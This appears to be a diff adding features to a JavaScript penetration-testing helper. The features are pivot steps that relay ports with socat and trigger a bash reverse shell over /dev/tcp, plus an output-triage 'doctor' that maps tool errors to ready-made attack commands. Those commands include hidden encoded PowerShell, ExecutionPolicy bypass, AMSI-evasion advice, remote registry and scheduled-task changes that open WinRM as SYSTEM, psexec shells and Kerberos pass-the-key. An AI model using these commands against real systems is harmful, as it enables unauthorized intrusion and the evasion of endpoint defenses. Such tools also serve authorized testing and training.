+          { locus: 'target$', title: 'Step 2 (Linux Pivot): Relay Port ' + rPort + ' with socat', label: 'Step 2 (Linux Pivot): Relay port ' + rPort + ' with socat', note: 'Or on Windows Pivot (Admin): netsh interface portproxy add v4tov4 listenport=' + rPort + ' listenaddress=0.0.0.0 connectport=' + rPort + ' connectaddress=' + lhost, cmd: 'socat TCP-LISTEN:' + rPort + ',fork,reuseaddr TCP:' + lhost + ':' + rPort + ' &' },
+          { locus: 'target$', title: 'Step 3: Trigger Reverse Shell on Internal Host to ' + pivIp + ':' + rPort, label: 'Step 3: Point internal target payload at ' + pivIp + ':' + rPort, note: 'Internal host connects to ' + pivIp + ':' + rPort + '.', cmd: 'bash -i >& /dev/tcp/' + pivIp + '/' + rPort + ' 0>&1' },
+        ];
+      }
+    }
+    return { scenario: scenario, tool: tool, summary: note, note: note, steps: steps };
+  };
+
+  // ── Upgraded Output & Error Doctor (Benign OS Baselines + Error Remediation) ─────────────────
+  var STOCK_SUID_BINS = {
+    'passwd': 1, 'su': 1, 'sudo': 1, 'mount': 1, 'umount': 1, 'chsh': 1, 'chfn': 1, 'newgrp': 1, 'gpasswd': 1,
+    'fusermount': 1, 'fusermount3': 1, 'ping': 1, 'ping6': 1, 'traceroute6.iputils': 1, 'pppd': 1,
+    'openssh-keysign': 1, 'ssh-keysign': 1, 'dbus-daemon-launch-helper': 1, 'eject': 1, 'dmcrypt-get-device': 1,
+    'Xorg.wrap': 1, 'snap-confine': 1, 'polkit-agent-helper-1': 1, 'unix_chkpwd': 1, 'chage': 1, 'expiry': 1,
+    'bsd-write': 1, 'wall': 1, 'write': 1, 'at': 1, 'crontab': 1, 'pam_timestamp_check': 1, 'pt_chown': 1
+  };
+
+  W.scanBenignBaselines = function (text, command) {
+    var t = String(text == null ? '' : text);
+    var cmd = String(command == null ? '' : command);
+    if (!t.trim()) return [];
+    var out = [];
+
+    // 1. Linux SUID find output where every binary is a default stock OS binary
+    var suidLines = t.split(/\r?\n/).map(function (l) { return l.trim(); }).filter(function (l) {
+      return /^\/(?:usr\/|bin\/|sbin\/|lib\/|snap\/|opt\/)\S+$/.test(l);
+    });
+    if (suidLines.length >= 2 || (/find\b.*-perm/i.test(cmd) && suidLines.length >= 1)) {
+      var stock = [], custom = [];
+      suidLines.forEach(function (p) {
+        var b = p.split('/').pop();
+        if (STOCK_SUID_BINS[b]) stock.push(b);
+        else custom.push(p);
+      });
+      if (stock.length && custom.length === 0) {
+        var suidWhy = 'All ' + stock.length + ' SUID binaries (' + stock.slice(0, 8).join(', ') + (stock.length > 8 ? '...' : '') + ') are stock Linux system binaries with no standard GTFOBins SUID escape.';
+        var suidFix = 'Cross SUID off your list. Pivot to sudo -l, file capabilities (getcap -r / 2>/dev/null), internal ports (ss -tlnp), or cron jobs (pspy64).';
+        out.push({
+          id: 'suid-stock',
+          title: 'SUID Scan Complete: Only Standard OS Binaries Found (' + stock.length + ' ignored)',
+          verdict: 'Dead End (Benign Baseline)',
+          detail: suidWhy, why: suidWhy,
+          next: suidFix, fix: suidFix
+        });
+      }
+    }
+
+    // 2. Windows whoami /priv with only standard low-privilege tokens
+    if (/PRIVILEGES INFORMATION/i.test(t) || /\bSeChangeNotifyPrivilege\b/i.test(t)) {
+      var hasHighWinPriv = /\b(SeImpersonatePrivilege|SeAssignPrimaryTokenPrivilege|SeBackupPrivilege|SeRestorePrivilege|SeDebugPrivilege|SeTakeOwnershipPrivilege|SeLoadDriverPrivilege|SeManageVolumePrivilege|SeCreateTokenPrivilege|SeTcbPrivilege|SeRelabelPrivilege)\b/i.test(t);
+      if (!hasHighWinPriv) {
+        var privWhy = 'Only default baseline privileges (such as SeChangeNotifyPrivilege or SeShutdownPrivilege) are present. SeImpersonatePrivilege and SeBackupPrivilege are absent.';
+        var privFix = 'Token impersonation (GodPotato/PrintSpoofer) will not work under this account. Check group memberships (whoami /groups), stored credentials (cmdkey /list), unquoted/modifiable services, scheduled tasks, or PowerShell history.';
+        out.push({
+          id: 'whoami-priv-standard',
+          title: 'Windows Token Privileges: Standard Low-Privilege Account',
+          verdict: 'Dead End (No Potato / Token Escalation)',
+          detail: privWhy, why: privWhy,
+          next: privFix, fix: privFix
+        });
+      }
+    }
+
+    // 3. sudo -l explicit denial
+    if (/Sorry,\s+user\s+\S+\s+may not run sudo|is not allowed to run sudo|is not in the sudoers file/i.test(t)) {
+      var sudoWhy = 'The sudoers policy explicitly denies sudo execution for this user.';
+      var sudoFix = 'Move on to SUID/SGID binaries, Linux capabilities (getcap -r / 2>/dev/null), writable cron scripts, internal localhost services (ss -tlnp), or credentials in web/app config files.';
+      out.push({
+        id: 'sudo-denied',
+        title: 'Sudo Check Complete: Account Has Zero Sudo Rules',
+        verdict: 'Dead End (No Sudo Rights)',
+        detail: sudoWhy, why: sudoWhy,
+        next: sudoFix, fix: sudoFix
+      });
+    }
+
+    // 4. Default /etc/crontab with only standard run-parts maintenance jobs
+    if (/\/etc\/cron\.(?:hourly|daily|weekly|monthly)/i.test(t)) {
+      var cronCustom = t.split(/\r?\n/).filter(function (l) {
+        var s = l.trim();
+        if (!s || s[0] === '#' || /^(?:SHELL|PATH|MAILTO|HOME)=/i.test(s)) return false;
+        if (/^[*0-9\/,-]+\s+[*0-9\/,-]+\s+[*0-9\/,-]+\s+[*0-9\/,-]+\s+[*0-9\/,-]+/.test(s)) {
+          return !/run-parts\s+--report\s+\/etc\/cron\.(?:hourly|daily|weekly|monthly)|anacron|debian-sa1|e2scrub_all/i.test(s);
+        }
+        return false;
+      });
+      if (cronCustom.length === 0) {
+        var cronWhy = 'Only standard Debian/Ubuntu run-parts schedules (cron.hourly, cron.daily, cron.weekly, cron.monthly) are present in /etc/crontab.';
+        var cronFix = 'Check /etc/cron.d/, /var/spool/cron/crontabs/, and systemctl list-timers, or run pspy64 to spot root cron jobs hidden from low-privilege users.';
+        out.push({
+          id: 'crontab-default',
+          title: 'System /etc/crontab: Only Default OS Maintenance Jobs Listed',
+          verdict: 'Dead End in /etc/crontab',
+          detail: cronWhy, why: cronWhy,
+          next: cronFix, fix: cronFix
+        });
+      }
+    }
+
+    return out;
+  };
+
+  var DOCTOR_ERRORS = [
+    { id: 'host-down', re: /Note:\s*Host seems down|0 hosts up|host (?:seems|appears) to be down/i,
+      title: 'Nmap Blocked by ICMP Ping Filter (Host Seems Down)',
+      why: 'The target firewall drops ICMP echo requests, so Nmap stops before scanning any TCP ports.',
+      fix: 'Re-run Nmap with -Pn to skip ICMP host discovery.',
+      fixTpl: 'nmap -Pn -p- --min-rate 3000 -T4 {{target}}' },
+    { id: 'dns-fail', re: /Could not resolve host(?:name)?|Name or service not known|Temporary failure in name resolution|The DNS query name does not exist/i,
+      title: 'Hostname Resolution Failed (/etc/hosts Missing Entry)',
+      why: 'The target redirected to or requires a virtual hostname/FQDN that is not in your Kali /etc/hosts file.',
+      fix: 'Append the target IP and hostname/domain to /etc/hosts on Kali.',
+      fixTpl: "echo '{{target}} {{domain}}' | sudo tee -a /etc/hosts" },
+    { id: 'krb-skew', re: /KRB_AP_ERR_SKEW|clock skew too great|time difference too large/i,
+      title: 'Kerberos Clock Skew Rejected Ticket (>5 Minute Drift)',
+      why: 'Active Directory rejects Kerberos tickets when your Kali clock differs from the Domain Controller by more than 5 minutes.',
+      fix: 'Disable local NTP and sync your Kali clock directly against the Domain Controller.',
+      fixTpl: 'sudo timedatectl set-ntp off && sudo rdate -n {{target}} || sudo ntpdate {{target}}' },
+    { id: 'krb-spn-ip', re: /KDC_ERR_S_PRINCIPAL_UNKNOWN|Server not found in Kerberos database/i,
+      title: 'Kerberos Principal Unknown (Used IP Instead of FQDN)',
+      why: 'Kerberos SPNs are registered to the host FQDN (e.g. dc01.acme.internal), not its IP address.',
+      fix: 'Run nxc smb to read the DC hostname + domain, add it to /etc/hosts, and pass the FQDN instead of the IP.',
+      fixTpl: 'nxc smb {{target}}' },
+    { id: 'crlf-bad-interp', re: /bad interpreter:\s*No such file or directory|\^M:\s*bad interpreter|\\r':\s*bad interpreter/i,
+      title: 'Windows CRLF Line Endings Breaking Linux Script',
+      why: 'The script was saved with Windows \\r\\n line endings, so Linux looks for /bin/bash\\r and fails.',
+      fix: 'Strip carriage returns (\\r) in-place with sed or dos2unix.',
+      fixTpl: "sed -i 's/\\r$//' script.sh && chmod +x script.sh" },
+    { id: 'sudo-no-tty', re: /sudo:\s*(?:no tty present|a (?:terminal|password) is required)|must be run from a terminal/i,
+      title: 'Interactive TTY Required for sudo / su',
+      why: 'You are in a non-interactive web or reverse shell, and sudo/su refuses to read a password without a pseudo-terminal.',
+      fix: 'Upgrade the shell to a Python PTY (or /usr/bin/script) before running sudo/su.',
+      fixTpl: 'python3 -c \'import pty;pty.spawn("/bin/bash")\'' },
+    { id: 'ssh-pubkey', re: /Permission denied \(publickey(?:,gssapi-keyex,gssapi-with-mic)?\)/i,
+      title: 'SSH Refused Password Authentication (PublicKey Only)',
+      why: 'sshd_config has PasswordAuthentication no. Password brute-forcing or spraying SSH on this host will never succeed.',
+      fix: 'Stop password attempts on SSH; hunt for an id_rsa key via LFI, SMB/NFS shares, or web backups.',
+      fixTpl: 'chmod 600 id_rsa && ssh -i id_rsa {{user}}@{{target}}' },
+    { id: 'ssh-bad-perms', re: /UNPROTECTED PRIVATE KEY FILE|Permissions 0[0-7]{3} for .* are too open/i,
+      title: 'SSH Private Key Permissions Too Open',
+      why: 'OpenSSH refuses to use a private key if group/other users can read it.',
+      fix: 'Restrict key permissions to owner read/write only (0600).',
+      fixTpl: 'chmod 600 id_rsa && ssh -i id_rsa {{user}}@{{target}}' },
+    { id: 'pw-must-change', re: /STATUS_PASSWORD_MUST_CHANGE|STATUS_PASSWORD_EXPIRED/i,
+      title: 'Valid Credential, But Password Must Be Changed Before Use',
+      why: 'The password is correct, but AD has "User must change password at next logon" set on the account.',
+      fix: 'Reset the expired password remotely over SMB using NetExec change-password module or smbpasswd.',
+      fixTpl: "nxc smb {{target}} -u {{user}} -p '{{password}}' -M change-password -o NEWPASS='NewPass2026!'" },
+    { id: 'amsi-blocked', re: /This script contains malicious content and has been blocked|AMSI_RESULT_DETECTED|contains a virus or potentially unwanted software/i,
+      title: 'Windows Defender / AMSI Blocked the Payload',
+      why: 'AMSI or Defender signature-matched the script or binary on disk.',
+      fix: 'Switch to an alternate binary (GodPotato / RunasCs) or encode the command in Workbench Codec.',
+      fixTpl: 'powershell.exe -nop -w hidden -enc <BASE64_PAYLOAD>' },
+    { id: 'ps-exec-policy', re: /cannot be loaded because running scripts is disabled on this system|PSSecurityException/i,
+      title: 'PowerShell ExecutionPolicy Blocked Script Execution',
+      why: 'The default Windows PowerShell ExecutionPolicy blocks .ps1 files unless bypassed via flags.',
+      fix: 'Pass -ExecutionPolicy Bypass when invoking powershell.exe.',
+      fixTpl: 'powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\\script.ps1' },
+    { id: 'ldap-anon-disabled', re: /000004DC:\s*LdapErr:\s*DSID-0C09075A|In order to perform this operation a successful bind must be completed/i,
+      title: 'Anonymous LDAP Bind Disabled by Domain Controller',
+      why: 'Windows Server 2019/2022 disables unauthenticated LDAP queries by default (except RootDSE).',
+      fix: 'Enumerate domain users via SMB null/guest RID cycling instead of anonymous LDAP.',
+      fixTpl: "nxc smb {{target}} -u 'guest' -p '' --rid-brute" },
+    { id: 'hashcat-token-exc', re: /Token length exception|No hashes loaded|Separator unmatched|Signature unmatched|Line-length exception/i,
+      title: 'Hashcat Rejected the Hash Format',
+      why: 'The hash file still has a username: prefix, wrapped lines, quotes, or the wrong -m mode.',
+      fix: 'Paste the raw line into Workbench -> Hash ID to strip the prefix or add --username.',
+      fixTpl: 'hashcat --username -m 1000 hash.txt /usr/share/wordlists/rockyou.txt' },
+    { id: 'ffuf-wildcard', re: /the server returns a status code that matches the provided options for non existing urls|use the "--wildcard" switch/i,
+      title: 'Web Fuzzer Hit Wildcard Catch-All Responses',
+      why: 'The web server returns HTTP 200 (or same status) for every nonexistent URL, flooding the fuzzer.',
+      fix: 'Re-run ffuf with -ac (auto-calibrate) or -fs <size> to filter wildcard responses.',
+      fixTpl: 'ffuf -u http://{{target}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ac' },
+    { id: 'protected-users', re: /KDC_ERR_ETYPE_NOSUPP|KDC has no support for encryption type/i,
+      title: 'Account in Protected Users Group (NTLM / RC4 Rejected)',
+      why: 'Protected Users blocks NTLM pass-the-hash and RC4 tickets; only AES Kerberos authentication is allowed.',
+      fix: 'Request a Kerberos TGT using the account AES256 key and authenticate with -k.',
+      fixTpl: "impacket-getTGT '{{domain}}/{{user}}' -aesKey <AES256_KEY> && export KRB5CCNAME={{user}}.ccache" },
+    { id: 'xfreerdp-tls', re: /BIO_do_handshake failed|ERRCONNECT_TLS_CONNECT_FAILED|freerdp_tls_handshake/i,
+      title: 'FreeRDP TLS Handshake Rejected by Kali OpenSSL 3 (Legacy TLS 1.0 / SHA-1)',
+      why: 'Windows Server 2008 R2 / 2012 / Windows 7 negotiates TLS 1.0 with a SHA-1 self-signed RDP certificate, which OpenSSL 3 rejects during BIO_do_handshake before /cert:ignore runs.',
+      fix: 'Add /tls:seclevel:0 (and /sec:rdp if TLS is disabled after setting UserAuthentication=0) to xfreerdp.',
+      fixTpl: "xfreerdp /v:{{target}} /d:'{{domain}}' /u:'{{user}}' /p:'{{password}}' /cert:ignore /tls:seclevel:0 +clipboard" },
+    { id: 'winrm-wmi-quickconfig', re: /Set-WSManQuickConfig\s*:\s*Access is denied|WsManError,Microsoft\.WSMan\.Management\.SetWSManQuickConfigCommand/i,
+      title: 'Set-WSManQuickConfig Blocked Over WMI Network Logon (Port 5985 Not Created)',
+      why: 'WMI (nxc smb -x and impacket-wmiexec) uses a Logon Type 3 network token that WSMan rejects during Set-WSManQuickConfig, aborting before the HTTP 5985 listener is created.',
+      fix: 'Enable the WinRM HTTP 5985 listener via Registry AllowAutoConfig + IPv4Filter + service restart and initialize PSRemoting via a SYSTEM scheduled task (or use impacket-psexec).',
+      fixTpl: "nxc smb {{target}} -u '{{user}}' -p '{{password}}' -x '(reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service\" /v AllowAutoConfig /t REG_DWORD /d 1 /f & reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service\" /v IPv4Filter /t REG_SZ /d \"*\" /f & reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f & netsh advfirewall firewall add rule name=WinRM dir=in action=allow protocol=TCP localport=5985 & sc config WinRM start= auto & net stop WinRM & net start WinRM & schtasks /create /tn WinRMInit /tr \"powershell.exe -NoProfile -Command Enable-PSRemoting -Force\" /sc ONSTART /ru SYSTEM /f & schtasks /run /tn WinRMInit & ping -n 5 127.0.0.1 >nul & schtasks /delete /tn WinRMInit /f)'" },
+    { id: 'winrm-conn-refused', re: /Errno::ECONNREFUSED[^\r\n]*port 5985|Connection refused[^\r\n]*:5985\b/i,
+      title: 'Evil-WinRM Connection Refused on Port 5985 (No HTTP Listener Bound)',
+      why: 'TCP port 5985 passed the firewall and returned TCP RST because no WinRM HTTP listener is bound on the target (common on Server 2008 R2 or when Enable-PSRemoting failed over WMI).',
+      fix: 'Use impacket-psexec for an immediate interactive SYSTEM shell over SMB 445, or enable the WinRM listener via Registry AllowAutoConfig + WinRM service restart.',
+      fixTpl: "impacket-psexec '{{domain}}/{{user}}:{{password}}@{{target}}'" },
+  ];
+
+  W.diagnoseErrors = function (text, commandOrVals, valsArg) {
+    var t = String(text == null ? '' : text);
+    if (!t.trim()) return [];
+    var vals = (commandOrVals && typeof commandOrVals === 'object') ? commandOrVals : (valsArg || {});
+    var target = vals.target || '{{target}}';
+    var domain = vals.domain || '{{domain}}';
+    var user = vals.user || vals.username || '{{user}}';
+    var pass = vals.password || '{{password}}';
+    var lines = t.split(/\r?\n/);
+    var out = [], seen = {};
+    for (var i = 0; i < DOCTOR_ERRORS.length; i++) {
+      var d = DOCTOR_ERRORS[i];
+      if (!seen[d.id] && d.re.test(t)) {
+        seen[d.id] = 1;
+        var matchedLine = '';
+        for (var j = 0; j < lines.length; j++) {
+          if (d.re.test(lines[j])) { matchedLine = lines[j].trim(); break; }
+        }
+        var fixCmd = String(d.fixTpl || '')
+          .replace(/\{\{target\}\}/g, target)
+          .replace(/\{\{domain\}\}/g, domain)
+          .replace(/\{\{user\}\}/g, user)
+          .replace(/\{\{password\}\}/g, pass);
+        out.push({ id: d.id, title: d.title, why: d.why, fix: d.fix, matchedLine: matchedLine, cmd: fixCmd, fixCmd: fixCmd });
+      }
+    }
+    return out;
+  };
+
+  W.triageOutput = function (text, opts) {
+    opts = opts || {};
+    var command = opts.command || '';
+    var vals = opts.params || opts;
+    var errors = W.diagnoseErrors(text, command, vals);
+    var baselines = W.scanBenignBaselines(text, command);
+    var signals = W.scanSignals(text);
+    var winSigs = signals.filter(function (s) { return s.tone === 'win'; });
+    var verdict;
+    if (errors.length) {
+      verdict = {
+        tone: 'warn',
+        title: errors.length + ' Actionable Tool / Protocol Error' + (errors.length === 1 ? '' : 's') + ' Detected',
+        summary: 'The command hit a fixable blocker (' + errors[0].title + '). Copy the remediation command below and re-run.'
+      };
+    } else if (winSigs.length) {
+      verdict = {
+        tone: 'win',
+        title: winSigs.length + ' High-Value Security Lead' + (winSigs.length === 1 ? '' : 's') + ' Found',
+        summary: 'Actionable attack path spotted: ' + winSigs[0].label + '. Follow the recommended next move below.'
+      };
+    } else if (baselines.length) {
+      verdict = {
+        tone: 'info',
+        title: 'Benign OS Baseline Confirmed (' + baselines[0].verdict + ')',
+        summary: baselines[0].why + ' ' + baselines[0].fix
+      };
+    } else if (signals.length) {
+      verdict = {
+        tone: 'info',
+        title: signals.length + ' Notable Output Signal' + (signals.length === 1 ? '' : 's') + ' Spotted',
+        summary: signals[0].label + ': ' + signals[0].meaning
+      };
+    } else {
+      verdict = {
+        tone: 'info',
+        title: 'No Known Error Blockers or Stock Dead-Ends Matched',
+        summary: 'Review any Minted Facts below or paste full raw command output (including headers and error lines) for deeper triage.'
+      };
+    }
+    return { verdict: verdict, errors: errors, baselines: baselines, signals: signals };
   };
 
   // ── finding narratives (what the facts add up to) ────────────────────────────────────────────
